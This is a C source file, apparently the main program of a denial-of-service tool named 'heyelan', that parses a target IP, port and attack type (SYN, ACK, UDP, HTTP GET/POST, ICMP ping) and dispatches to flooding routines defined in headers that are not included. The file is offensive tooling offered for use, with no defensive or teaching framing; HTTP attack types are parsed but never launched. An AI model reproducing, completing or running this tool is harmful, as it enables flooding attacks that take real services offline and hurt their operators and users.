#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "tcp_attack.h"
#include "udp_attack.h"
#include "icmp_attack.h"
#include "http_attack.h"
#include "checksum.h"
#include "types.h"

struct target_data target;

void heyelan_usage(char *argv[])
{
	fprintf(stdout, "\nusage: %s [options]\n\
-a [attack type] : DoS attack type (syn, ack, udp, get, post, ping)\n\
-t [target IP address] : target IP address to attack\n\
-p [target port] : target port to attack\n\
-h : help message\n\n", argv[0]);
	exit(EXIT_FAILURE);
}

void parse_args(int argc, char *argv[])
{
	int opt;

	if (argc < 2) {
		heyelan_usage(argv);
	}

	while ((opt = getopt(argc, argv, "a:t:p:h")) != -1) {
		switch (opt) {
		case 'a':
			if (!optarg)
				break;
			if (!strncmp(optarg, "syn", 3))
				target.attack_type = ATTACK_TCP_SYN;
			else if (!strncmp(optarg, "ack", 3))
				target.attack_type = ATTACK_TCP_ACK;
			else if (!strncmp(optarg, "udp", 3))
				target.attack_type = ATTACK_UDP;
			else if (!strncmp(optarg, "get", 3))
				target.attack_type = ATTACK_HTTP_GET;
			else if (!strncmp(optarg, "post", 4))
				target.attack_type = ATTACK_HTTP_POST;
			else if (!strncmp(optarg, "ping", 4))
				target.attack_type = ATTACK_ICMP_PING;
			break;
		case 't':
			inet_pton(AF_INET, optarg, &target.target_addr);
			break;
		case 'p':
			target.target_port = atoi(optarg);
			break;
		case 'h':
			heyelan_usage(argv);
			break;
		case '?':
			break;
		}
	}
}

int main(int argc, char *argv[])
{
	memset(&target, 0, sizeof(struct target_data));
	parse_args(argc, argv);

	if (!target.target_addr) {
		fprintf(stdout, "target address not specified, aborting.\n");
		exit(EXIT_FAILURE);
	}

	if (target.attack_type == ATTACK_TCP_SYN)
		attack_tcp_syn(&target);
	else if (target.attack_type == ATTACK_TCP_ACK)
		attack_tcp_ack(&target);
	else if (target.attack_type == ATTACK_UDP)
		attack_udp(&target);
	else if (target.attack_type == ATTACK_ICMP_PING)
		attack_icmp_ping(&target);

	return 0;
}
